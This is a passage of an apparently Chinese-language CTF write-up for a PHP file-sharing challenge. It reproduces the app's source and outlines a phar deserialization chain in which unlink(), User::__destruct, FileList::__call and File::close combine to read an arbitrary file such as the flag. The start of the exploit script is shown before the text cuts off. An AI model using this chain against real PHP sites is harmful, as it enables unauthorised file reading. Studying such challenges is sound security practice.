<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>delete.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$pos</span> = <span class="title function_ invoke__">strrpos</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>, <span class="number">0</span>, <span class="variable">$pos</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$fileext</span> = <span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/gif&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/jpeg&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/png&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Only gif/jpg/png allowed&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$dst</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>] . <span class="variable">$filename</span> . <span class="variable">$fileext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dst</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invaild filename&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>phar的思路还是不清晰，还得多思考</p>
<p>在class的file类里，delect()函数使用了unlink（）函数，故存在phar反序列化的可能。</p>
<p>寻找尝试</p>
<p>注意到</p>
<p>   user类里面存在$this-&gt;db-&gt;close();</p>
<p>本来应该是想要调用mysql语句，但是在file类里面也存在close()，可以读取任意文件</p>
<p>filelist类里面有call</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br></pre></td></tr></table></figure>

<p>注意到</p>
<p>user()destruct定义了一个db的全局变量，可以覆写db为其他类，然后调用close，触发call，然后传入file的close类里面然后读取flag</p>
<p>猜测可能是flag.txt</p>
<p>exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        